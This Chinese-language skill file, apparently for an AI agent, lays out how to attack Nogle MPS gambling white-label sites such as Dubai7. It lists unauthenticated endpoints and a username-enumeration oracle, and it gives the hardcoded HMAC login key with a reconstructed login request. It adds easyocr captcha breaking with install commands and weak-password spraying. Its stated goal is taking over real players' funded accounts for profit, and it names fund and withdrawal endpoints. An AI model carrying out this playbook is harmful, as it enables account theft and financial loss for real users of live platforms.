---
name: 商燕飞·诺盘
description: "打 Nogle MPS 博彩白标平台时使用(多租户). JS挖API/HMAC密钥泄露/用户名枚举/验证码破解/弱口令."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, gambling, nogle, whitelabel, hmackey, captcha, easyocr]
    category: daaixianzun
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# Nogle MPS 博彩平台渗透(Dubai7/alltocon 家族)

## 触发条件
- 目标为 Nogle MPS 多租户博彩框架, 指纹:
  - JS webpack chunk 名含 `nogle_react_boilerplate`
  - 前端 React SPA, 品牌代码如 `rc6prod`, 图片域 `img.bubble-blue.com` / `img.alltocon.com`
  - API 形如 `https://api.{brand}.{tld}/{brandcode}-ecp/api/v1`
  - 域名家族: {brand}.co / .net / .im / .store; 厂商域 `stomdown.com` / `jomatem.com`
  - 经典: Dubai7(印度, BRL), Gen/泰系等

## 核心认知
1. **多租户**: 一个 Java Spring 后端 + 前端同构建 → 同一 API key/enum 全品牌通用.
   `GET /mothership/whitelabel/info` 未授权拿租户注册表(prefix/wl_code/ecp域).
2. **前端是壳**: React 懒加载 chunk 里藏真实资产. 从 `runtimechunk~main.*.js` 提取 chunk map
   (`static/js/"+{id:"Name",...[e]})+.."{id:"hash"}`), 全量下 226+ chunk. JS 混淆重.
3. **登录密码加密 = HMAC-SHA1(pwd, key)**, key 硬编码在客户端模块(本例 `lhGaeLmCJg`, 模块51767, 回退 localStorage playerid).
4. **登录/注册都强制验证码**(captcha apirequired=true, loginerrorlimit=5); 注册另有手机OTP+Turnstile → 别死磕注册,走登录弱口令.
5. **easyocr 可破验证码**(tesseract 命中率低, ~30% vs easyocr). CPU torch 装法见下.

## 关键端点(未授权)
- `GET /players/lookup?q=<user>` — **未授权用户名枚举**(精确匹配 oracle, 返回用户存在与否). 全库拖数据.
- `GET /player/showinfo` — 未授权返回验证码 `{uuid, image(base64)}`(登录用!)
- `GET /login/setting` — 验证码策略 + i18n
- `GET /register/setting` — 注册/手机验证策略(mobileValidation.blockRegister=false 等)
- `GET /mothership/whitelabel/info` — 租户注册表
- `GET /depositRankingInfo?...` — 充值排行(Top1 金额=流水量级)
- `GET /games?platform=1` — 游戏目录(5000+), /ads /announcements /floatingads /staticpagesettings/* /bankcard/setting /jackpot/config /adjustConfig/get /dashboard/displaySetting
- `/config` → 301 到 `http://api.*:5000/config/`(内部config服务, SSRF候选)
- 提分手: /password /pin /resetpassword /forgetusername 需精确参数否则499 UNHANDLED_EXCEPTION

## 登录攻击链 (变现有: 撞库拿高价值玩家号)
1. **用户名枚举**: `/players/lookup?q=` 跑词表(admin/dubai+印度名+弱密码风格) → 存用户清单
2. **HMAC 复刻**: 从 JS 模块(如 login chunk `m-(subscribe) 9674` 的 `h=a(51767)`)提取 key; 复刻完整登录 payload
   ```
   POST /rc6prod-ecp/api/v1/login
   {"loginname":user,"loginpassword":HMAC-SHA1(pwd,key),"captcha":code,"captchauuid":uuid,
    "fingerprint":"0000000000000000","portalid":"MOBILE","rawPassword":null}
   ```
   - 响应 `code:2 "userid or password is incorrect"` = 验证码过+密码错; `"token"` = 成功
3. **验证码破解**: easyocr (见下) → 每个验证码产生4-8候选 → 与密码列表 zip 配对(每候选不同密码)
4. **弱口令优先**: username==password, User@123, Abcd1234, 123456, admin123
5. 命中后认证头 `Authorization: <JWT>`, JWT HS256 3h, payload 有 username/role/isop

## easyocr 环境(easy经)
```bash
# Python3.13 pip PEP668 → 用已有 venv 或新建
python3 -m venv /tmp/pvenv  # 或复用
/tmp/pvenv/bin/pip install torch torchvision --index-url https://download.pytorch.org/whl/cpu  # 千万别装 GPU torch(几GB)
/tmp/pvenv/bin/pip install easyocr
# Reader(['en'], gpu=False); readtext 用文件路径(不要 BytesIO, 会空结果); 多预处理+allowlist 字母数字
```
验证: easyocr 命中率 ~50%(比 tesseract 好); 每验证码生成 5 预处+ 候选.

## 认证后
- `Authorization: <token>`(可 `Bearer` 无效) → /profile /transactions /deposits /withdrawals /cashsummary /transfers
- 资金端点绑会话 token, `?playerid=` 参数无效(无水平 IDOR)
- 提现参数名是 `withdrawalAmt`

## 坑
- 官方/测试号常见空余额; 变现打 有余额/流水 的实名玩家号
- 验证码图 difficult(高噪), 注册前端掩码只收8位手机
- aecricex.xyz 板球交易所 ref 已 NXDOMAIN; WS 需 token
- pip 拉 GPU torch 会卡几GB, 务必 CPU index

## 关联
- 白标博彩通法见 whitelabel-gambling-pentest